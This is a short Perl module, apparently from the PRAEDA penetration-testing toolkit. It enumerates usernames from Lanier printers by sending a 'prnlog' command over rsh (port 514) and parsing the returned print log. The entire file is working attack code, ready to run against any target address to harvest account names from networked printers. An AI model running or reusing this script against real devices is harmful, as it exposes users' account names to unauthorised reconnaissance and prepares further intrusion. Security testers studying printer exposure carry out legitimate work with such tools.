# Lanier Universal Username Enumeration 
#
#
#
######################################################
#              PRAEDO Module #MP0016                 #
#                                                    #
#                                                    #
#                Chris Teodorski                     #
#                    aka                             #
#                   __  _                            #
#      __ __ _ _ _ /  \| |__  ___ __ _ _ _  ___      #
#     / _/ _` | ' \ () | '_ \/ -_) _` | ' \(_-<      # 
#     \__\__,_|_||_\__/|_.__/\___\__,_|_||_/__/      #
#                                                    #
#                                                    #
######################################################              


package MP0016;
use strict;
sub MP0016
{

use IO::Socket; 

my $SELF; 
my $TARGET = $_[1]; 
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];

my $LOCAL_USER = "praeda"; 
my $REMOTE_USER = "praeda"; 
my $CMD = "prnlog"; 
my $PORT = "2000"; 
my $SOCKET;



open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
print "\n**********Attempting to enumerate users from print log $TARGET : JOB MA0016**********\n";
print OUTFILE "\n**********Attempting to enumerate users from print log $TARGET : JOB MA0016**********\n";




$SOCKET = IO::Socket::INET->new(PeerAddr=>$TARGET,PeerPort=>'514',
                                                LocalPort=>$PORT,
                                                Proto=>"tcp"); 

print $SOCKET "0\0"; 
print $SOCKET "$LOCAL_USER\0"; 
print $SOCKET "$REMOTE_USER\0"; 
print $SOCKET "$CMD\0";  

my @RESULTS=<$SOCKET>; 

foreach (@RESULTS) {

my $USERNAME = substr($_,13,10);
if ($USERNAME =~ m/[^\s]/){
    print $USERNAME;
    print OUTFILE $USERNAME;
    print "\n";
    print OUTFILE "\n";
}
}

}
1;
